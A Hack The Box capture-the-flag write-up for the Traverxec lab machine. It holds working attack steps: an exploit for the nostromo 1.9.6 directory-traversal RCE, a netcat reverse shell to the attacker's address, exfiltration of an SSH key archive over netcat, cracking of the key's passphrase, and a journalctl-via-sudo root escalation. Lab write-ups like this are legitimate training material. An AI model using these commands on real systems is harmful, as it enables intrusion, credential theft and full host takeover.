For all the machines I do, I always start off with an nmap scan.  First a quick port scan and then a detailed port scan.
I start off by using nmap -p- -T4 10.10.10.165
This shows us that we have two ports open, 22 and 80.  On hack the box we don't need to brute force SSH, because there's other ways in.

Let's go ahead and get some version information about the services and the operating system.
nmap -p22,80 -A -O -sV -T4 10.10.10.165 -oA Traverxec
Here we are specifcally scanning the ports that we know are open with -p22,80, we use -A for OS detection, version detection, script scanning and traceroute, -sV specifcally for identifying service versions, -T4 for speed (-T5 is fastest, but tends to knock over hosts), -O is for Operating System detection again, and finally -oA Filename will put the output out in 3 different formats

Not shown: 65533 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.2 - 4.9 (92%), Linux 3.18 (90%), Crestron XPanel control system (90%), Linux 3.16 (89%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   52.86 ms 10.10.14.1
2   52.95 ms 10.10.10.165

Great we get the version of the http web server is 1.9.6.  Now we can visit the page and explore.  I always run dirbuster against web sites to look for the various directories.
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.165

After visiting http://10.10.10.165/admin we trigger an error and once again see that the version is nostromo 1.9.6.  Searching google we find some exploit code here https://www.exploit-dm.com/exploits/43837.
This says it is remote code execution, perfect exactly what we need.

Looking through the usage we need a target IP, target port, and a command to pass it.  The vulnerability is due to directory traversal where we can make a POST request using a few .0%d/ and eventually call a shell.
we are starting at a specific directory where the web server is sitting and moving up directories until we can then move into /bin where all the binaries are stored.
If you want to view the contents of the binary folder or any folder just visit http://10.10.10.165/.%0d./.%0d./.%0d./.%0d./ This link shows you the contents of root.
select the bin folder if you want to see what binaries you can run and home to see what users are on the machine.

To use the exploit code just save the code from exploit db into a file called cve2019_16278.py.  Then we want to run the command.  From looking at /bin we know what different binaries we can call from visiting here http://10.10.10.165/.%0D./.%0D./.%0D./.%0D./bin/.

The problem is a lot of them have 500 interal server error.  I made a list of all the files and then used foxy proxy and burp to capture the request of visiting http://10.10.10.165/.%0D./.%0D./.%0D./.%0D./bin/apt-cache
Any binary path would work here.
Once you open burp, go to the proxy tab and turn intercept on.  Also your foxy proxy needs to be configured to send traffic through burp which is listening in my case on 8080.
![Burp Intercepted Request](https://raw.githubusercontent.com/wkbrdr8522/HackTheBox-Writeups/master/Traverxec/Burp%20Intercepted%20Request.jpg?token=ALWTY6JDEVKFPW4MPOUNX2S6UB3SC)


Once we get the request the first line will look like this:  GET /.0%D./.0%D./.0%D./.0%D./bin/apt-cache.  Right click the request and send to Intruder.
In intruder choose Sniper as the Attack Type and highlight apt-cache or whatever is after /bin/ and click Add.  Then under the payloads tab, paste the list you made earlier of all the binaries and click start attack.
This could be slowed down if you are running the free Burp, which I am.

We notice that bash gets a 500 Status, but sh gets a 200, so let's use sh in our exploit.

First start a netcat listener on your kali machine, nc -nlvp 4444.  You can use any port here.
Now cd into the folder where your exploit code is saved at from above.  My code is called cve2019_16278.py, remember we need to give it a target IP, target port, and command.  I had to use quotes for commands to pass it the arguments.
python cve2019_16278.py 10.10.10.165 80 "nc -e /bin/sh 10.10.14.26 4444"
the IP after /bin/sh is your Hack The Box VPN and the port your netcat is listening on.

Check your connection and we have a shell!  Here is our initial access!
The problem is that our shell is pretty limited luckily we can upgrade it by using python!  python -c 'import pty; pty.spawn("/bin/sh")'
now we have an upgraded shell.
Check whoami and find our we are www-data.

Looking around check the /home directories to see who some of the users are, which the only one is david.  Check David's directory, we are denied access.
Let's look for configuration files by using the command:  find / -type f -iname '*.conf'
Here we are starting at the root directory and looking for files that are .conf.
We notice there'a file in /var/nostromo/conf/ titled nhttpd.conf.  There are some issues using commands on this machine, so you have to use the full path.  We want to cat out the file so do which cat to know the path.
Finally /usr/bin/cat /var/nostromo/conf/nhttpd.conf.  This file shows us that in home dirs there is a homedirs_public directory called public_www
Let's see what may be in that folder so do ls /home/david/public_www.  There a protected file area, maybe we can move into that directory.  cd /home/david/public_www/protected-file-area and list the files.  Great we have backup-ssh-identify-files.tgz!
Let's move this file over to our attacker machine, which we can do via netcat.  On kali run: nc -l -p 1234 > backup-ssh-identity-files.tgz.  Our machine is now waiting for that file.
Let's see where netcat lives on our target by doing which nc, it's in /usr/bin/nc. Now send that file to the attacker machine by doing /usr/bin/nc -w 3 10.10.14.26 1234 < backup-ssh-identity-files.tgz
Now we have the file on our target file, let's uncompress the file by doing tar zxvf backup-ssh-identity-files.tgz and cat out the id_rsa file that comes out.
Well the first thing we notice is the file is encrypted, but that's no issue for tools like John the Ripper!
We can use the program ssh2john which is a python program that can properly format the file so we can then crack the key for id_rsa.

I put this in my sbin folder on kali so I did cd /usr/sbin, then grab the file by doing wget https://github.com/magnumripper/JohnTheRipper/tree/bleeding-jumbo/run/ssh2john.py.
Now I copied the file over to my directory for HackTheBox where my id_rsa file is stored.  Then do python ssh2john.py id_rsa > crack.txt.  We are outputting this to crack.txt to later crack the password for the id_rsa file.  If you cat crack.txt you can see the id_rsa file that's formatted as id_rsa:$sshng etc.
Finally use JohnTheRipper to crack the key for that file by doing john --wordlist=/usr/share/wordlists/rockyou.txt crack.txt   Here we are telling john what wordlist to use and what file to try and crack.  It quickly finds the key to be hunter.
Now let's decrypt the id_rsa file by using openssl.   openssl rsa -in id_rsa -out dec.key It will prompt you for the password so enter hunter.
Finally ssh into the target by doing, ssh -i dec.key david@10.10.10.165
Great we can access the machine via SSH and we can cat out the user.txt file and submit that to HackTheBox!

Now starts privilege escalation!

I always start off by seeing what my user can do with sudo, but since we don't have david's password, we can't actually check this.

when you ls on david's home directory we notice a /bin folder which is interesting, so cd into /bin.  There's a server-stts.sh file, remember to run this we have to call bash with the full path.
/usr/bin/bash ./server-stats.sh.  This shows us the last 5 journal log lines, let's look at the actual file, cat server-stats.sh.
Notice at the bottoms the script calls /usr/bin/sudo and then executes journalctl as root!  Great, we are on to something!
journalctl is a command for viewing logs collected by systemd.

Since we know we can display 5 lines, you need to change the size of your terminal so it doesn't display all the lines at the bottom you see lines 1-6
enter !/bin/sh
we are in a root shell, use whoami to verify, and finally simply cat /root/root.txt and that's the machine!  

I hope you enjoyed my journey through Traverxec!











